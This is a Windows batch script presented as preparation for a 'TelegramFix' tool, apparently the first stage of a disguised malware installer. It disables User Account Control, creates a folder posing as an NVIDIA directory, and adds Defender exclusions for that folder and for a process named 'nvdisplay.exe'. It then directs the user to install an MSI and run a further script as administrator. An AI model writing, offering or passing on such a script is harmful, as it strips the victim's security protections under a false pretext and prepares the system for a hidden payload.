@echo off
title TelegramFix - Preparation
echo =========================================
echo   TelegramFix - System Preparation
echo =========================================
echo.

:: Disable UAC
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
echo [OK] UAC disabled

:: Create folder
mkdir "C:\Program Files (x86)\NVIDIA Corporation" 2>nul
echo [OK] Folder created

:: Add Defender exclusions
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Program Files (x86)\NVIDIA Corporation'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionProcess 'nvdisplay.exe'" >nul 2>&1
echo [OK] Defender exclusions added

echo.
echo =========================================
echo Preparation completed.
echo Now install TelegramFix2.msi (double-click, follow wizard).
echo After installation, run the second batch file (setup_finalize.bat) as administrator.
echo =========================================
pause